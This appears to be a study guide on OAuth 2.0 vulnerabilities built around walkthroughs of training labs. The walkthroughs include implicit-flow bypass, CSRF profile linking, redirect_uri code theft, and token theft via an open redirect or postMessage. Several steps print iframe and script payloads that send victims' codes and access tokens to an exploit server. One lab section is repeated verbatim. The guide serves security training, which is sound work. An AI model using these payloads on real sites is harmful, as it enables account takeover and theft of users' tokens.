# OAuth 2.0 authentication vulnerabilities

## OAuth authentication 

OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user's account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application. This means users can fine-tune which data they want to share rather than having to hand over full control of their account to a third party.

OAuth authentication is generally implemented as follows:

1. The user chooses the option to log in with their social media account. The client application then uses the social media site's OAuth service to request access to some data that it can use to identify the user. This could be the email address that is registered with their account, for example.
2. After receiving an access token, the client application requests this data from the resource server, typically from a dedicated /userinfo endpoint.
3. Once it has received the data, the client application uses it in place of a username to log the user in. The access token that it received from the authorization server is often used instead of a traditional password.

## How does OAuth 2.0 work?

OAuth 2.0 was originally developed as a way of sharing access to specific data between applications. 

- **Client application** - The website or web application that wants to access the user's data.
- **Resource owner** - The user whose data the client application wants to access.
- **OAuth service provider** - The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.

1. The client application requests access to a subset of the user's data, specifying which grant type they want to use and what kind of access they want.
2. The user is prompted to log in to the OAuth service and explicitly give their consent for the requested access.
3. The client application receives a unique access token that proves they have permission from the user to access the requested data. Exactly how this happens varies significantly depending on the grant type.
4. The client application uses this access token to make API calls fetching the relevant data from the resource server.

### Authentication bypass via OAuth implicit flow

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

**Solution**
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that make up the OAuth flow. This starts from the authorization request ```GET /auth?client_id=[...]```.
3. Notice that the client application (the blog website) receives some basic information about the user from the OAuth service. It then logs the user in by sending a *POST* request containing this information to its own */authenticate* endpoint, along with the access token.
4. Send the *POST /authenticate* request to Burp Repeater. In Repeater, change the email address to *carlos@carlos-montoya.net* and send the request. Observe that you do not encounter an error.
5. Right-click on the *POST* request and select "Request in browser" > "In original session". Copy this URL and visit it in your browser. You are logged in as Carlos and the lab is solved.

## Vulnerabilities in the OAuth client application

**Improper implementation of the implicit grant type**

Due to the dangers introduced by sending access tokens via the browser, the implicit grant type is mainly recommended for single-page applications. However, it is also often used in classic client-server web applications because of its relative simplicity.

### Authentication bypass via OAuth implicit flow

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

**Solution**
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that make up the OAuth flow. This starts from the authorization request ```GET /auth?client_id=[...]```.
3. Notice that the client application (the blog website) receives some basic information about the user from the OAuth service. It then logs the user in by sending a *POST* request containing this information to its own */authenticate* endpoint, along with the access token.
4. Send the *POST /authenticate* request to Burp Repeater. In Repeater, change the email address to *carlos@carlos-montoya.net* and send the request. Observe that you do not encounter an error.
5. Right-click on the *POST* request and select "Request in browser" > "In original session". Copy this URL and visit it in your browser. You are logged in as Carlos and the lab is solved.

**Flawed CSRF protection**

Consider a website that allows users to log in using either a classic, password-based mechanism or by linking their account to a social media profile using OAuth. In this case, if the application fails to use the state parameter, an attacker could potentially hijack a victim user's account on the client application by binding it to their own social media account.

### Forced OAuth profile linking

**Solution**
1. While proxying traffic through Burp, click "My account". You are taken to a normal login page, but notice that there is an option to log in using your social media profile instead. For now, just log in to the blog website directly using the classic login form.
2. Notice that you have the option to attach your social media profile to your existing account.
3. Click "Attach a social profile". You are redirected to the social media website, where you should log in using your social media credentials to complete the OAuth flow. Afterwards, you will be redirected back to the blog website.
4. Log out and then click "My account" to go back to the login page. This time, choose the "Log in with social media" option. Observe that you are logged in instantly via your newly linked social media account.
5. In the proxy history, study the series of requests for attaching a social profile. In the ```GET /auth?client_id[...]``` request, observe that the *redirect_uri* for this functionality sends the authorization code to */oauth-linking*. Importantly, notice that the request does not include a state parameter to protect against CSRF attacks.
6. Turn on proxy interception and select the "Attach a social profile" option again.
7. Go to Burp Proxy and forward any requests until you have intercepted the one for ```GET /oauth-linking?code=[...]```. Right-click on this request and select "Copy URL".
8. Drop the request. This is important to ensure that the code is not used and, therefore, remains valid.
9. Turn off proxy interception and log out of the blog website.
10. Go to the exploit server and create an iframe in which the src attribute points to the URL you just copied. The result should look something like this:

    ``` html
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
    ```

11. Deliver the exploit to the victim. When their browser loads the iframe, it will complete the OAuth flow using your social media profile, attaching it to the admin account on the blog website.
12. Go back to the blog website and select the "Log in with social media" option again. Observe that you are instantly logged in as the admin user. Go to the admin panel and delete Carlos to solve the lab.

## Leaking authorization codes and access tokens

### OAuth account hijacking via redirect_uri

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

**Solution**
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Log out and then log back in again. Observe that you are logged in instantly this time. As you still had an active session with the OAuth service, you didn't need to enter your credentials again to authenticate yourself.
3. In Burp, study the OAuth flow in the proxy history and identify the **most recent** authorization request. This should start with ```GET /auth?client_id=[...]```. Notice that when this request is sent, you are immediately redirected to the *redirect_uri* along with the authorization code in the query string. Send this authorization request to Burp Repeater.
4. In Burp Repeater, observe that you can submit any arbitrary value as the *redirect_uri* without encountering an error. Notice that your input is used to generate the redirect in the response.
5. Change the *redirect_uri* to point to the exploit server, then send the request and follow the redirect. Go to the exploit server's access log and observe that there is a log entry containing an authorization code. This confirms that you can leak authorization codes to an external domain.
6. Go back to the exploit server and create the following *iframe* at */exploit*:

    ```html
    <iframe src="https://YOUR-LAB-OAUTH-SERVER-ID.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
    ```

7. Store the exploit and click "View exploit". Check that your iframe loads and then check the exploit server's access log. If everything is working correctly, you should see another request with a leaked code.
8. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.
9. Log out of the blog website and then use the stolen code to navigate to:

    ``` https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE ```

    The rest of the OAuth flow will be completed automatically and you will be logged in as the admin user. Open the admin panel and delete Carlos to solve the lab.

**Flawed redirect_uri validation**

The best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. This way, when the OAuth service receives a new request, it can validate the redirect_uri parameter against this whitelist. In this case, supplying an external URI will likely result in an error. However, there may still be ways to bypass this validation.

**Stealing codes and access tokens via a proxy page**

### Stealing OAuth access tokens via an open redirect

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

**Solution**
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Study the resulting requests and responses. Notice that the blog website makes an API call to the userinfo endpoint at */me* and then uses the data it fetches to log the user in. Send the *GET /me* request to Burp Repeater.
3. Log out of your account and log back in again. From the proxy history, find the most recent ```GET /auth?client_id=[...]``` request and send it to Repeater.
4. In Repeater, experiment with the ```GET /auth?client_id=[...]``` request. Observe that you cannot supply an external domain as *redirect_uri* because it's being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the /../ directory traversal sequence.
5. Log out of your account on the blog website and turn on proxy interception in Burp.
6. In your browser, log in again and go to the intercepted ```GET /auth?client_id=[...]``` request in Burp Proxy.
7. Confirm that the *redirect_uri* parameter is in fact vulnerable to directory traversal by changing it to:

    ``` https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1 ```

    Forward any remaining requests and observe that you are eventually redirected to the first blog post. In your browser, notice that your access token is included in the URL as a fragment.
8. With the help of Burp, audit the other pages on the blog website. Identify the "Next post" option at the bottom of each blog post, which works by redirecting users to the path specified in a query parameter. Send the corresponding ```GET /post/next?path=[...]``` request to Repeater.
9. In Repeater, experiment with the path parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.
10. Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the ```redirect_uri``` pointing to the open redirect, which subsequently forwards the victim to your exploit server:

    ``` https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email ```

11. Test that this URL works correctly by visiting it in your browser. You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.
12. On the exploit server, create a suitable script at /exploit that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:

    ```html
    <script>
    window.location = '/?'+document.location.hash.substr(1)
    </script>
    ```

13. To test that everything is working correctly, store this exploit and visit your malicious URL again in your browser. Then, go to the exploit server access log. There should be a request for ```GET /?access_token=[...]```.
14. You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:

    ```html
    <script>
        if (!document.location.hash) {
            window.location = 'https://YOUR-LAB-AUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
        } else {
            window.location = '/?'+document.location.hash.substr(1)
        }
    </script>
    ```

15. To test that the exploit works, store it and then click "View exploit". The page should appear to refresh, but if you check the access log, you should see a new request for ```GET /?access_token=[...]```.
16. Deliver the exploit to the victim, then copy their access token from the log.
17. In Repeater, go to the *GET /me* request and replace the token in the *Authorization: Bearer* header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
18. Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.

### Stealing OAuth access tokens via a proxy page

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

**Solution**
1. Study the OAuth flow while proxying traffic through Burp. Using the same method as in the previous lab, identify that the *redirect_uri* is vulnerable to directory traversal. This enables you to redirect access tokens to arbitrary pages on the blog website.
2. Using Burp, audit the other pages on the blog website. Observe that the comment form is included as an iframe on each blog post. Look closer at the */post/comment/comment-form* page in Burp and notice that it uses the postMessage() method to send the *window.location.href* property to its parent window. Crucially, it allows messages to be posted to any origin (*).
3. From the proxy history, right-click on the ```GET /auth?client_id=[...]``` request and select "Copy URL". Go to the exploit server and create an iframe in which the src attribute is the URL you just copied. Use directory traversal to change the redirect_uri so that it points to the comment form. The result should look something like this:

    ```html
    <iframe src="https://YOUR-LAB-AUTH-SERVER/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
    ```

4. Below this, add a suitable script that will listen for web messages and output the contents somewhere. For example, you can use the following script to reveal the web message in the exploit server's access log:

    ```html
    <script>
        window.addEventListener('message', function(e) {
            fetch("/" + encodeURIComponent(e.data.data))
        }, false)
    </script>
    ```

5. To check the exploit is working, store it and then click "View exploit". Make sure that the *iframe* loads then go to the exploit server's access log. There should be a request for which the path is the full URL of the comment form, along with a fragment containing the access token.
6. Go back to the exploit server and deliver this exploit to the victim. Copy their access token from the log. Make sure you don't accidentally include any of the surrounding URL-encoded characters.
7. Send the *GET /me request* to Burp Repeater. In Repeater, replace the token in the *Authorization: Bearer* header with the one you just copied and send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
8. Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.
